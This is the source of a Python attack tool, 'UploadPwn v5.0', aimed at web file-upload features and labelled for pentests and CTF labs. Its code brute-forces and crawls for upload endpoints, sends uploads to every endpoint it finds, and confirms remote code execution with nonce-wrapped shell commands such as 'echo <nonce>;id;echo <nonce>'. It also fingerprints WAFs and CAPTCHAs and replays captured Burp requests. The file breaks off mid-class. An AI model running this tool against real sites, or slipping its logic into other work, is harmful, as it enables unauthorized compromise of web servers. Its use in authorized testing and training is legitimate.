#!/usr/bin/env python3
"""
UploadPwn v5.0 - Universal File Upload Attack Tool
For authorized penetration testing and CTF/HTB lab environments only.
"""

import requests, sys, time, base64, threading, argparse, os, re, json, hashlib
from urllib.parse import quote, urljoin, urlparse
from datetime import datetime
from pathlib import Path

__version__ = "5.0.0"


# Report state machine — one of four mutually-exclusive outcomes per step.
STATE_RCE_CONFIRMED   = "RCE_CONFIRMED"
STATE_UPLOAD_ACCEPTED = "UPLOAD_ACCEPTED"
STATE_FILTER_BYPASSED = "FILTER_BYPASSED"
STATE_FAILED          = "FAILED"
REPORT_STATES = (STATE_RCE_CONFIRMED, STATE_UPLOAD_ACCEPTED,
                 STATE_FILTER_BYPASSED, STATE_FAILED)


class RequestBudgetExceeded(Exception):
    """Raised when the per-target HTTP request budget is exhausted."""


def payload_hash(content):
    """SHA-256 hex of payload bytes; used in the audit log."""
    if content is None:
        return None
    if isinstance(content, str):
        content = content.encode("utf-8", errors="replace")
    try:
        return hashlib.sha256(content).hexdigest()
    except Exception:
        return None


# CAPTCHA detection — body markers that indicate a human-challenge gate
CAPTCHA_PATTERNS = re.compile(
    r"(g-recaptcha|recaptcha/api\.js|hcaptcha|h-captcha|"
    r"cf-challenge|cf_chl_|turnstile|captcha[_-]?image|"
    r"<input[^>]*name=[\"'](?:captcha|g-recaptcha-response|h-captcha-response)[\"'])",
    re.I,
)

try:
    import pyotp
    PYOTP_OK = True
except ImportError:
    PYOTP_OK = False


def join_url(base, path):
    """Robust URL join: handles missing slash, absolute paths, and absolute URLs."""
    if not path:
        return base
    if path.startswith(("http://", "https://")):
        return path
    if not base.endswith("/"):
        base = base + "/"
    return urljoin(base, path.lstrip("/"))


def smart_endpoint(target, endpoint):
    """Resolve any of these `--endpoint` shapes into (full_url, effective_target):

      • '/path/upload.php'              → joined to target
      • 'upload.php'                     → joined to target (no leading slash)
      • 'http://other.tld/upload.php'    → absolute; effective_target swaps to 'http://other.tld'
      • 'https://...'                    → same as above
      • 'other.tld/upload.php'           → schemeless host+path; inherit target's scheme,
                                            effective_target swaps to '<scheme>://other.tld'
      • 'other.tld:8080/upload.php'      → schemeless host:port+path; same handling
      • '//other.tld/upload.php'         → protocol-relative; same handling

    Returns (full_url, effective_target). `effective_target` is the base used for
    storage-path discovery / shell-dir brute-force; it MUST match the host that
    actually serves the upload.
    """
    target = target.rstrip("/")
    if not endpoint:
        return target, target

    # Absolute URL — trust it completely.
    if endpoint.startswith(("http://", "https://")):
        u = urlparse(endpoint)
        return endpoint, f"{u.scheme}://{u.netloc}"

    # Protocol-relative: '//host/path'
    if endpoint.startswith("//"):
        scheme = urlparse(target).scheme or "http"
        full = f"{scheme}:{endpoint}"
        u = urlparse(full)
        return full, f"{u.scheme}://{u.netloc}"

    # Path-only (most common).
    if endpoint.startswith("/"):
        return join_url(target, endpoint), target

    # Heuristic: schemeless host+path. Requires BOTH a '/' (so there's a path
    # part) AND a head that looks like a hostname (dot/colon, and not a file
    # extension like .php/.html/.aspx). A bare 'upload.php' is a filename, not
    # a host.
    _FILE_EXT_RE = re.compile(
        r"\.(php\w?|phtml|phar|aspx?|jsp[xa]?|cfm|do|action|cgi|pl|py|rb|"
        r"html?|json|xml|txt|do|svg|gif|png|jpe?g|webp|avif|bin)$", re.I)
    if "/" in endpoint:
        head = endpoint.split("/", 1)[0]
        if ("." in head or ":" in head) and head not in (".", "..") \
                and not _FILE_EXT_RE.search(head):
            scheme = urlparse(target).scheme or "http"
            full = f"{scheme}://{endpoint}"
            u = urlparse(full)
            return full, f"{u.scheme}://{u.netloc}"

    # Bare relative filename — join to target.
    return join_url(target, endpoint), target


# Phrases that prove a page is still the login screen / a failure
LOGIN_FAIL_PATTERNS = re.compile(
    r"invalid|incorrect|wrong\s+(?:password|credential|user)|"
    r"login\s+failed|authentication\s+failed|bad\s+credentials|"
    r"try\s+again|denied",
    re.I,
)
LOGIN_OK_PATTERNS = re.compile(
    r"logout|sign\s*out|dashboard|welcome|my\s+account|profile",
    re.I,
)
OTP_PAGE_PATTERNS = re.compile(
    r"(two[\s-]?factor|2fa|one[\s-]?time|otp|verification\s+code|"
    r"authenticator|enter.{0,20}code)",
    re.I,
)

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.keys import Keys
    SELENIUM_OK = True
except ImportError:
    SELENIUM_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ─── ANSI ─────────────────────────────────────────────────────────────────────
R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
M="\033[95m"; C="\033[96m"; W="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"

def p(color, tag, msg): print(f"{color}{BOLD}[{tag}]{W} {msg}")
def ok(m):   p(G,"✓",m)
def fail(m): p(R,"✗",m)
def info(m): p(B,"*",m)
def warn(m): p(Y,"!",m)
def pwn(m):  p(M,"!!!",m)

BANNER = f"""{C}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║              U P L O A D P W N  v5.0                            ║
║     Universal File Upload Attack Tool — HTB/OSCP Edition         ║
╠══════════════════════════════════════════════════════════════════╣
║  ✓ Multi-step login  ✓ Sub-page navigation  ✓ Interactive shell  ║
║  ✓ Auto form detect  ✓ CSRF handling        ✓ Zero hardcoded     ║
╚══════════════════════════════════════════════════════════════════╝{W}"""


# ═══════════════════════════════════════════════════════════════════════════════
#  CORE V5 PRIMITIVES — transport, auth, classifier, nonce, path discovery, Burp -r
# ═══════════════════════════════════════════════════════════════════════════════

import secrets as _secrets
import uuid as _uuid
from email.parser import BytesParser
from email.policy import compat32 as _compat32


class TransportConfig:
    """All transport-layer knobs in one object — proxy/insecure/timeout/retry/UA."""
    def __init__(self, proxy=None, insecure=False, timeout=15,
                 retries=3, backoff=0.5, delay=0.0, jitter=0.0,
                 user_agent=None, ca_bundle=None, max_redirects=5,
                 rate_limit=None, threads=1, follow_redirects=True,
                 request_budget=5000, waf_pause=3.0):
        self.proxy           = proxy
        self.insecure        = insecure
        self.timeout         = timeout
        self.retries         = retries
        self.backoff         = backoff
        self.delay           = delay
        self.jitter          = jitter
        self.user_agent      = user_agent or (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"
        )
        self.ca_bundle       = ca_bundle
        self.max_redirects   = max_redirects
        self.rate_limit      = rate_limit          # requests-per-second cap (float) or None
        self.threads         = max(1, threads)
        self.follow_redirects = follow_redirects
        self.request_budget  = request_budget      # hard cap on total HTTP requests per target
        self.waf_pause       = waf_pause           # seconds to sleep when WAF fingerprint seen
        # runtime counters (mutated by SessionManager._request)
        self.requests_sent   = 0
        self._last_request_ts = 0.0

    def apply(self, session: requests.Session):
        if self.proxy:
            session.proxies.update({"http": self.proxy, "https": self.proxy})
        session.verify = (False if self.insecure else (self.ca_bundle or True))
        if self.insecure:
            try:
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            except Exception:
                pass
        session.headers["User-Agent"] = self.user_agent
        session.max_redirects = self.max_redirects
        try:
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
            retry = Retry(
                total=self.retries, backoff_factor=self.backoff,
                status_forcelist=[429, 502, 503, 504],
                allowed_methods=frozenset(["GET", "POST", "PUT", "DELETE", "HEAD"]),
                respect_retry_after_header=True,
                raise_on_status=False,
            )
            adapter = HTTPAdapter(pool_connections=32, pool_maxsize=128,
                                  max_retries=retry)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
        except Exception as e:
            warn(f"adapter init failed: {e}")
        return session


class AuthAdapter:
    """Pluggable auth — Basic, Digest, NTLM, Bearer, API-key, mTLS."""
    def __init__(self, requests_auth=None, header_add=None, cert=None):
        self.requests_auth = requests_auth
        self.header_add    = header_add or {}
        self.cert          = cert

    @classmethod
    def basic(cls, user, password):
        from requests.auth import HTTPBasicAuth
        return cls(requests_auth=HTTPBasicAuth(user, password))

    @classmethod
    def digest(cls, user, password):
        from requests.auth import HTTPDigestAuth
        return cls(requests_auth=HTTPDigestAuth(user, password))

    @classmethod
    def ntlm(cls, user, password):
        try:
            from requests_ntlm import HttpNtlmAuth
        except ImportError:
            raise RuntimeError("pip install requests-ntlm for --ntlm-auth")
        return cls(requests_auth=HttpNtlmAuth(user, password))

    @classmethod
    def bearer(cls, token):
        return cls(header_add={"Authorization": f"Bearer {token}"})

    @classmethod
    def api_key(cls, header, value):
        return cls(header_add={header: value})

    @classmethod
    def mtls(cls, cert_path, key_path=None):
        return cls(cert=(cert_path, key_path) if key_path else cert_path)


# Login response classifiers — body + URL signal
LOGIN_FAIL_PATTERNS = re.compile(
    r"invalid\s*(credentials|password|user|login)|incorrect|"
    r"wrong\s+(?:password|credential|user)|login\s+failed|"
    r"authentication\s+failed|bad\s+credentials|access\s+denied",
    re.I,
)
LOGIN_OK_PATTERNS = re.compile(
    r"logout|sign\s*out|dashboard|welcome|my\s+account|control\s+panel",
    re.I,
)
# OTP requires BOTH (a) page mentions code-entry AND (b) a code-shaped field
OTP_BODY_PATTERNS = re.compile(
    r"(two[\s-]?factor|2fa|one[\s-]?time|otp|verification\s+code|"
    r"authenticator|enter.{0,30}code)",
    re.I,
)
OTP_FIELD_PATTERNS = re.compile(
    r'<input[^>]*name=["\'](?:code|otp|token|2fa|verify|pin|tfa)["\']',
    re.I,
)


def classify_response(response, login_url=None):
    """Return 'ok' | 'otp' | 'fail'. login_url helps fall back when body has no signal."""
    text = getattr(response, "text", "") or ""
    url  = getattr(response, "url", "")  or ""
    has_otp_body  = bool(OTP_BODY_PATTERNS.search(text))
    has_otp_field = bool(OTP_FIELD_PATTERNS.search(text))
    looks_otp_url = any(x in url.lower() for x in ("/2fa", "/otp", "/verify-otp", "/two-factor"))
    if (has_otp_body and has_otp_field) or looks_otp_url:
        # if page also clearly shows post-auth markers, treat as ok (e.g. /email-verify-success)
        if LOGIN_OK_PATTERNS.search(text):
            return "ok"
        return "otp"
    if LOGIN_FAIL_PATTERNS.search(text):
        return "fail"
    if LOGIN_OK_PATTERNS.search(text):
        return "ok"
    if login_url and login_url.rstrip("/") not in url.rstrip("/"):
        return "ok"
    return "fail"


class NonceVerifier:
    """Random-nonce-wrapped command for false-positive-free RCE confirmation."""
    def make(self, cmd="id"):
        n = _uuid.uuid4().hex[:16]
        return f"echo {n};{cmd};echo {n}", n

    def confirm(self, body, nonce):
        # both markers AND something between them
        if not body or not nonce:
            return False
        first = body.find(nonce)
        last  = body.rfind(nonce)
        return first != -1 and last != -1 and last > first


def extract_upload_path(response):
    """Discover the actual storage path of an uploaded file from the response.
       Sources, in order of confidence:
         1. Location header (302/201 Location:)
         2. Refresh header (Refresh: 0;url=/uploads/x.jpg)
         3. JSON body — {path|url|file|src|location|filename}, nested too
         4. <meta http-equiv="refresh" content="0;url=…">
         5. HTML href=/src= to a known upload extension
         6. Inline JS — window.location.href / location.replace / "uploaded to"
    """
    # 1. Location
    loc = response.headers.get("Location")
    if loc:
        return loc
    # 2. Refresh header
    refresh = response.headers.get("Refresh", "")
    m = re.search(r"url=([^;,\s]+)", refresh, re.I)
    if m:
        return m.group(1).strip("\"' ")
    # 3. JSON body
    try:
        j = response.json()
        for key in ("path", "url", "file", "src", "location", "filename"):
            if isinstance(j, dict) and j.get(key):
                return j[key]
        # nested {data: {path: ...}}
        if isinstance(j, dict):
            for v in j.values():
                if isinstance(v, dict):
                    for key in ("path", "url", "file", "src"):
                        if v.get(key):
                            return v[key]
    except Exception:
        pass
    text = response.text or ""
    # 4. <meta http-equiv="refresh" content="0;url=…">
    m = re.search(
        r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*url=([^"\'\s>]+)',
        text, re.I)
    if m:
        return m.group(1)
    # 5. HTML href/src to a known upload extension
    m = re.search(r'(?:href|src)=["\']([^"\']+\.(?:php|phtml|jpg|jpeg|png|gif|svg|webp|'
                  r'avif|bin|txt|zip|pdf|mp4|mp3))["\']',
                  text, re.I)
    if m:
        return m.group(1)
    # 6. JS redirect
    m = re.search(
        r'(?:location\.(?:href|replace)\s*=?\s*\(?|window\.location\s*=\s*)'
        r'["\']([^"\']+)["\']',
        text, re.I)
    if m:
        return m.group(1)
    return None


# Cloudflare/ModSec/Imperva fingerprints
WAF_PATTERNS = re.compile(
    r"(mod[_\s]?security|cloudflare|access\s+denied|incapsula|"
    r"sucuri|x-sucuri-id|naxsi|akamai\s+ghost|reference\s*#?\d{6,})",
    re.I,
)


# ═══════════════════════════════════════════════════════════════════════════════
#  ENDPOINT DISCOVERY — crawl, JS, robots, sitemap, openapi, OPTIONS, brute
# ═══════════════════════════════════════════════════════════════════════════════

# Default brute-force list — modest size, ordered by hit-rate from CTF/HTB stats
COMMON_UPLOAD_PATHS = [
    "/upload", "/upload.php", "/uploads", "/uploads/", "/upload/",
    "/api/upload", "/api/v1/upload", "/api/v2/upload", "/api/v3/upload",
    "/api/files", "/api/file", "/api/v1/files", "/api/v2/files",
    "/files/upload", "/files", "/file/upload", "/file",
    "/media/upload", "/media", "/admin/upload", "/admin/files",
    "/avatar", "/avatar/upload", "/profile/avatar", "/profile/upload",
    "/wp-admin/async-upload.php", "/wp-content/uploads/",
    "/sites/default/files/", "/uploadHandler.ashx",
    "/scripts/upload.php", "/cgi-bin/upload",
    "/index.php?action=upload", "/index.php?p=upload",
    "/dashboard/upload", "/account/upload", "/settings/avatar",
    "/static/upload", "/asset/upload", "/asset/uploads",
    "/graphql", "/api/graphql", "/v1/graphql",
    "/webdav/", "/dav/", "/files/dav/",
]

UPLOAD_PATH_HINTS = re.compile(
    r"(upload|attach|avatar|photo|image|media|file|asset|document|"
    r"profile_pic|gallery)",
    re.I,
)

JS_URL_PATTERNS = [
    re.compile(r"""fetch\(\s*["']([^"']+)["']""", re.I),
    re.compile(r"""axios\.(?:post|put|patch)\(\s*["']([^"']+)["']""", re.I),
    re.compile(r"""\$\.(?:ajax|post|put)\(\s*\{?\s*url\s*:\s*["']([^"']+)["']""", re.I),
    re.compile(r"""XMLHttpRequest.*open\(["']\w+["']\s*,\s*["']([^"']+)["']""", re.I),
    re.compile(r"""URL_UPLOAD\s*=\s*["']([^"']+)["']""", re.I),
    re.compile(r"""['"](/(?:api|upload|files?|media)/[a-zA-Z0-9_/.\-]+)['"]""", re.I),
    re.compile(r"""(/[a-zA-Z0-9_/.\-]+\.(?:php|aspx?|jsp))""", re.I),
]


class Endpoint:
    """Discovered upload endpoint candidate, with method + field + score."""
    __slots__ = ("url", "method", "field", "source", "score", "extras")

    def __init__(self, url, method="POST", field=None, source="", score=0, extras=None):
        self.url     = url
        self.method  = method.upper()
        self.field   = field
        self.source  = source
        self.score   = score
        self.extras  = extras or {}

    def __repr__(self):
        return (f"Endpoint({self.url} {self.method} field={self.field!r} "
                f"src={self.source} score={self.score})")


class EndpointDiscovery:
    """Find every plausible upload endpoint on a target.

    Sources, in roughly increasing certainty:
      1. brute-force COMMON_UPLOAD_PATHS  (HEAD/OPTIONS)
      2. robots.txt Disallow:             (informational paths)
      3. sitemap.xml                       (declared URLs)
      4. swagger.json / openapi.json       (multipart schemas)
      5. crawl from / following same-host links to depth N
      6. scrape JS bundles for fetch/axios/XHR upload URLs
      7. OPTIONS probe for Allow: PUT/PATCH/MKCOL on WebDAV paths
      8. /graphql multipart-upload spec probe
    """
    def __init__(self, target, transport=None, depth=2, max_pages=20,
                 session=None):
        self.target    = target.rstrip("/")
        self.transport = transport or TransportConfig()
        self.depth     = depth
        self.max_pages = max_pages
        self.session   = session or self.transport.apply(requests.Session())

    # ── helpers ────────────────────────────────────────────────────
    def _get(self, url, **kw):
        kw.setdefault("timeout", self.transport.timeout)
        kw.setdefault("allow_redirects", True)
        try:
            return self.session.get(url, **kw)
        except Exception:
            return None

    def _abs(self, base, link):
        if not link:
            return None
        return urljoin(base, link)

    # ── source 1: brute force common paths ────────────────────────
    def _brute_common(self, base):
        """Return the list of paths probed (used by tests & callers)."""
        tried = []
        for path in COMMON_UPLOAD_PATHS:
            tried.append(path)
        return tried

    def _brute_probe(self, base):
        found = []
        for path in COMMON_UPLOAD_PATHS:
            url = base + path
            r = self._get(url)
            if r is None:
                continue
            # 200 / 405 (method not allowed) / 401 / 415 all indicate "endpoint exists"
            if r.status_code in (200, 201, 301, 302, 401, 403, 405, 415):
                found.append(Endpoint(url, method="POST",
                                      source="brute", score=20))
        return found

    # ── source 2: robots.txt ──────────────────────────────────────
    def _scan_robots(self):
        r = self._get(self.target + "/robots.txt")
        if not r or r.status_code != 200:
            return []
        urls = []
        for line in (r.text or "").splitlines():
            m = re.match(r"\s*(?:Disallow|Allow|Sitemap):\s*(\S+)", line, re.I)
            if m:
                urls.append(m.group(1))
        return urls

    # ── source 3: sitemap.xml ─────────────────────────────────────
    def _scan_sitemap(self):
        r = self._get(self.target + "/sitemap.xml")
        if not r or r.status_code != 200:
            return []
        return re.findall(r"<loc>\s*([^<]+)\s*</loc>", r.text or "")

    # ── source 4: OpenAPI / swagger.json ──────────────────────────
    def _scan_openapi(self):
        found = []
        for path in ("/swagger.json", "/openapi.json", "/api/swagger.json",
                     "/v3/api-docs", "/api-docs", "/.well-known/openapi.json"):
            r = self._get(self.target + path)
            if not r or r.status_code != 200:
                continue
            try:
                spec = r.json()
            except Exception:
                continue
            paths = spec.get("paths") if isinstance(spec, dict) else None
            if not paths:
                continue
            for ep_path, methods in paths.items():
                for method, meta in (methods.items() if isinstance(methods, dict) else []):
                    if method.upper() not in ("POST", "PUT", "PATCH"):
                        continue
                    body = (meta or {}).get("requestBody", {})
                    content = body.get("content", {}) if isinstance(body, dict) else {}
                    if not any("multipart" in ct for ct in content):
                        continue
                    # extract first binary field name
                    field = None
                    for ct, ctmeta in content.items():
                        props = ((ctmeta or {}).get("schema") or {}).get("properties", {})
                        for k, v in props.items():
                            if isinstance(v, dict) and v.get("format") == "binary":
                                field = k; break
                        if field: break
                    found.append({"path": ep_path, "method": method.upper(),
                                  "field": field, "source": "openapi", "score": 50})
        return found

    # ── source 5: HTML crawl ──────────────────────────────────────
    def _crawl(self, start, limit=None):
        """BFS same-host crawl. Returns list of (url, html)."""
        seen, queue, pages = {start}, [start], []
        host = urlparse(start).netloc
        limit = limit or self.max_pages
        while queue and len(pages) < limit:
            cur = queue.pop(0)
            r = self._get(cur)
            if not r or r.status_code >= 400:
                continue
            pages.append((cur, r.text or ""))
            if not BS4_OK:
                continue
            soup = BeautifulSoup(r.text or "", "html.parser")
            for a in soup.find_all(["a", "link"]):
                href = a.get("href")
                if not href:
                    continue
                nxt = urljoin(cur, href)
                if urlparse(nxt).netloc != host:
                    continue
                if nxt in seen:
                    continue
                # de-prioritize obvious dead-ends
                if any(nxt.endswith(ext) for ext in (".css", ".png", ".jpg", ".ico", ".woff", ".woff2")):
                    continue
                seen.add(nxt)
                # rank pages with upload-y names first
                if UPLOAD_PATH_HINTS.search(nxt):
                    queue.insert(0, nxt)
                else:
                    queue.append(nxt)
        return pages

    def _extract_forms(self, base_url, html):
        """Yield (action_url, method, field_name) for EVERY file input.

        - One entry per `<input type=file>`, not per form (handles avatar + cover
          + gallery_pick in the same form).
        - Hidden inputs (display:none, hidden attr) are kept; SPAs use them.
        - File inputs OUTSIDE any <form> are reported too — endpoint is the
          page URL itself (the SPA will fetch() it via JS we scrape separately).
        """
        out = []
        if not BS4_OK:
            return out
        soup = BeautifulSoup(html, "html.parser")
        seen = set()
        # case A: file inputs inside a form
        for form in soup.find_all("form"):
            action = form.get("action") or base_url
            method = (form.get("method") or "post").lower()
            for inp in form.find_all("input", {"type": "file"}):
                field = inp.get("name")
                if not field:
                    continue
                key = (urljoin(base_url, action), method, field)
                if key in seen:
                    continue
                seen.add(key)
                out.append(key)
        # case B: orphan file inputs (drag-drop SPAs)
        all_inputs = soup.find_all("input", {"type": "file"})
        for inp in all_inputs:
            if inp.find_parent("form"):
                continue
            field = inp.get("name") or "file"
            key = (base_url, "post", field)
            if key in seen:
                continue
            seen.add(key)
            out.append(key)
        return out

    def _extract_js_srcs(self, base_url, html):
        if not BS4_OK:
            return []
        soup = BeautifulSoup(html, "html.parser")
        return [urljoin(base_url, s.get("src"))
                for s in soup.find_all("script")
                if s.get("src")]

    # ── source 6: JS bundle scrape ────────────────────────────────
    def _scan_js(self, url):
        r = self._get(url)
        if not r or r.status_code != 200:
            return []
        text = r.text or ""
        urls = set()
        for pat in JS_URL_PATTERNS:
            for m in pat.findall(text):
                if isinstance(m, tuple):
                    m = m[0]
                # keep only relative / same-host URLs
                if m.startswith("/") or self.target in m:
                    urls.add(m)
        return list(urls)

    # ── source 7: OPTIONS / WebDAV ────────────────────────────────
    def _scan_options(self, url):
        try:
            r = self.session.options(url, timeout=self.transport.timeout,
                                     allow_redirects=False)
        except Exception:
            return []
        allow = r.headers.get("Allow", "") if r is not None else ""
        return [m.strip().upper() for m in allow.split(",") if m.strip()]

    # ── public API ────────────────────────────────────────────────
    def discover(self):
        """Return a list of Endpoint objects, ranked by score (highest first)."""
        endpoints = {}   # url -> Endpoint  (de-dup by url+method)

        def _add(ep):
            # Key on (url, method, field) so a form with multiple file inputs
            # produces multiple Endpoint rows. Entries with no field
            # collapse onto the field-less key but bump the score of named
            # variants that share the URL.
            key = (ep.url, ep.method, ep.field or "")
            if key in endpoints:
                prev = endpoints[key]
                prev.score += ep.score
                if ep.source not in prev.source:
                    prev.source = (prev.source + "+" + ep.source).strip("+")
                return
            # If a fieldless entry exists for the same (url, method),
            # AND this new entry has a field, replace it (more useful)
            fieldless_key = (ep.url, ep.method, "")
            if ep.field and fieldless_key in endpoints:
                old = endpoints.pop(fieldless_key)
                ep.score += old.score
                ep.source = (old.source + "+" + ep.source).strip("+")
            endpoints[key] = ep

        # 1. brute common paths
        for ep in self._brute_probe(self.target):
            _add(ep)

        # 2. robots.txt
        for path in self._scan_robots():
            if path.startswith("http"):
                url = path
            else:
                url = self.target + ("/" + path.lstrip("/"))
            if UPLOAD_PATH_HINTS.search(url):
                _add(Endpoint(url, "POST", source="robots", score=10))

        # 3. sitemap.xml
        for path in self._scan_sitemap():
            if path.startswith("http"):
                url = path
            else:
                url = self.target + ("/" + path.lstrip("/"))
            # bump score if name hints upload
            score = 30 if UPLOAD_PATH_HINTS.search(url) else 5
            _add(Endpoint(url, "POST", source="sitemap", score=score))

        # 4. OpenAPI
        for ep in self._scan_openapi():
            url = self.target + ep["path"] if ep["path"].startswith("/") else ep["path"]
            _add(Endpoint(url, ep["method"], field=ep["field"],
                          source=ep["source"], score=ep["score"]))

        # 5+6. crawl + JS
        for page_url, html in self._crawl(self.target):
            for action, method, field in self._extract_forms(page_url, html):
                _add(Endpoint(action, method, field=field,
                              source="form", score=60))
            for js_src in self._extract_js_srcs(page_url, html):
                for u in self._scan_js(js_src):
                    full = urljoin(page_url, u)
                    score = 35 if UPLOAD_PATH_HINTS.search(full) else 5
                    _add(Endpoint(full, "POST", source="js", score=score))

        # 7. OPTIONS probe for WebDAV PUT (only on already-known dirs + a few common ones)
        webdav_candidates = set()
        for ep in list(endpoints.values()):
            parent = ep.url.rsplit("/", 1)[0] + "/"
            webdav_candidates.add(parent)
        webdav_candidates.update(self.target + p for p in
                                 ("/webdav/", "/dav/", "/files/dav/", "/uploads/"))
        for url in webdav_candidates:
            verbs = self._scan_options(url)
            if "PUT" in verbs or "MKCOL" in verbs:
                _add(Endpoint(url, "PUT", source="webdav", score=40,
                              extras={"allow": verbs}))

        # 8. GraphQL probe
        for path in ("/graphql", "/api/graphql", "/v1/graphql"):
            url = self.target + path
            r = self._get(url)
            if r and r.status_code in (200, 400, 405):
                _add(Endpoint(url, "POST", source="graphql", score=25,
                              extras={"graphql": True}))

        # Sort highest score first
        ranked = sorted(endpoints.values(), key=lambda e: -e.score)
        return ranked


# ═══════════════════════════════════════════════════════════════════════════════
#  MULTI-ENDPOINT ATTACKER — drives every discovered upload point in turn
# ═══════════════════════════════════════════════════════════════════════════════

class MultiEndpointAttacker:
    """Iterate every discovered Endpoint, dispatching POST/PUT/PATCH correctly.

    A real site exposes many upload paths (avatar, cover, document, API, WebDAV,
    SPA). The bypass that works on one rarely works on the others — filters
    diverge per route. This class drives the same payload (or matrix) across
    each one, dispatching the correct HTTP verb and field name per endpoint,
    and aggregates the result.
    """
    def __init__(self, endpoints, transport=None, session=None, disc=None):
        self.endpoints = list(endpoints)
        self.transport = transport or TransportConfig()
        self.session   = session or self.transport.apply(requests.Session())
        self.d         = disc
        self.results   = []   # list[dict]

    # ── single shot ──────────────────────────────────────────────────
    def probe(self, ep, content, filename, content_type, extra_fields=None):
        """Fire one upload at one endpoint, return result dict."""
        url    = ep.url
        method = (ep.method or "POST").upper()
        field  = ep.field or "file"
        try:
            if method in ("POST", "PATCH"):
                # multipart
                r = self.session.request(
                    method, url,
                    files={field: (filename, content, content_type)},
                    data=extra_fields or {},
                    timeout=self.transport.timeout,
                    allow_redirects=False)
            elif method == "PUT":
                # WebDAV style: raw body. If the URL ends with "/", append filename.
                target = url if not url.endswith("/") else url + filename
                r = self.session.put(
                    target, data=content,
                    headers={"Content-Type": content_type},
                    timeout=self.transport.timeout,
                    allow_redirects=False)
            else:
                return {"endpoint": ep, "url": url, "method": method,
                        "field": field, "status": 0,
                        "body": f"unsupported method {method}"}
            return {"endpoint": ep, "url": url, "method": method,
                    "field": field, "status": r.status_code,
                    "body": (r.text or "")[:300],
                    "location": r.headers.get("Location"),
                    "discovered_path": extract_upload_path(r)}
        except Exception as e:
            return {"endpoint": ep, "url": url, "method": method,
                    "field": field, "status": 0, "body": f"ERROR {e}"}

    def probe_each(self, content, filename, content_type, extra_fields=None):
        """Run probe() against every endpoint, store results, return them."""
        self.results = []
        for ep in self.endpoints:
            res = self.probe(ep, content, filename, content_type, extra_fields)
            self.results.append(res)
            if self.d:
                self.d.log("multi_endpoint", "info",
                           f"{res['method']} {res['url']} -> {res['status']}")
        return self.results

    def summary(self):
        ok_count   = sum(1 for r in self.results if 200 <= r["status"] < 300)
        fail_count = sum(1 for r in self.results if r["status"] >= 400 or r["status"] == 0)
        return {
            "total":   len(self.results),
            "ok":      ok_count,
            "failed":  fail_count,
            "by_endpoint": [
                {"url": r["url"], "method": r["method"], "field": r["field"],
                 "status": r["status"], "discovered_path": r.get("discovered_path")}
                for r in self.results
            ],
        }


# ═══════════════════════════════════════════════════════════════════════════════
#  BURP / RAW REQUEST PARSER (sqlmap-style -r)
# ═══════════════════════════════════════════════════════════════════════════════

class BurpRequest:
    """Parse and replay a raw HTTP request file (Burp 'Save item', ffuf -request,
       curl --trace-ascii, plain wire-dump). Binary-safe."""
    def __init__(self, method, path, http_version, headers, body, raw=b""):
        self.method        = method
        self.path          = path
        self.http_version  = http_version
        self.headers       = headers      # CaseInsensitiveDict
        self.body          = body         # bytes
        self.raw           = raw
        self.scheme        = None
        self.host          = headers.get("Host", "").strip()
        self._parse_target_from_headers()
        self.upload_field    = None
        self.upload_filename = None
        self.boundary        = None
        self._scan_multipart()

    def _parse_target_from_headers(self):
        # Detect TLS from common header hints (X-Forwarded-Proto / Origin)
        proto = self.headers.get("X-Forwarded-Proto")
        if proto:
            self.scheme = proto.lower()

    def _scan_multipart(self):
        ct = self.headers.get("Content-Type", "")
        m = re.search(r'boundary=([^\s;]+)', ct, re.I)
        if not m:
            return
        self.boundary = m.group(1).strip('"')
        parts = self.body.split(b"--" + self.boundary.encode())
        for part in parts:
            head, _, _ = part.partition(b"\r\n\r\n")
            if b"filename=" in head:
                m1 = re.search(rb'name="([^"]+)"', head)
                m2 = re.search(rb'filename="([^"]*)"', head)
                if m1:
                    self.upload_field    = m1.group(1).decode(errors="replace")
                if m2:
                    self.upload_filename = m2.group(1).decode(errors="replace")
                break

    @classmethod
    def from_file(cls, path):
        with open(path, "rb") as f:
            raw = f.read()
        return cls.from_bytes(raw)

    @classmethod
    def from_bytes(cls, raw):
        # Strip curl --trace-ascii prefixes if present
        if b"=> Send header" in raw or b"<= Recv" in raw:
            raw = cls._strip_curl_trace(raw)
        # Normalize line endings
        head, sep, body = raw.partition(b"\r\n\r\n")
        if not sep:
            head, sep, body = raw.partition(b"\n\n")
            # rebuild with CRLF for parser
            head = head.replace(b"\n", b"\r\n")
        # Parse request line + headers via email parser (header-only)
        lines = head.split(b"\r\n")
        if not lines:
            raise ValueError("empty request file")
        req_line = lines[0].decode("latin-1")
        m = re.match(r"^(\S+)\s+(\S+)\s+(HTTP/\S+)\s*$", req_line)
        if not m:
            raise ValueError(f"bad request line: {req_line!r}")
        method, target, version = m.group(1), m.group(2), m.group(3)
        # Parse headers (preserve case via simple list, then build CI dict)
        from requests.structures import CaseInsensitiveDict
        headers = CaseInsensitiveDict()
        for line in lines[1:]:
            if not line.strip():
                continue
            k, _, v = line.decode("latin-1").partition(":")
            headers[k.strip()] = v.strip()
        # Handle chunked transfer-encoding
        if headers.get("Transfer-Encoding", "").lower() == "chunked":
            body = cls._dechunk(body)
            del headers["Transfer-Encoding"]
            headers["Content-Length"] = str(len(body))
        # Handle gzip-encoded body
        if headers.get("Content-Encoding", "").lower() == "gzip" and body:
            try:
                import gzip
                body = gzip.decompress(body)
                del headers["Content-Encoding"]
                headers["Content-Length"] = str(len(body))
            except Exception:
                pass
        return cls(method, target, version, headers, body, raw=raw)

    @staticmethod
    def _strip_curl_trace(raw):
        out = []
        for line in raw.split(b"\n"):
            if line.startswith(b"=>") or line.startswith(b"<=") or line.startswith(b"== "):
                continue
            line = re.sub(rb"^\s*[0-9a-f]{4}:\s*", b"", line)
            out.append(line)
        return b"\n".join(out)

    @staticmethod
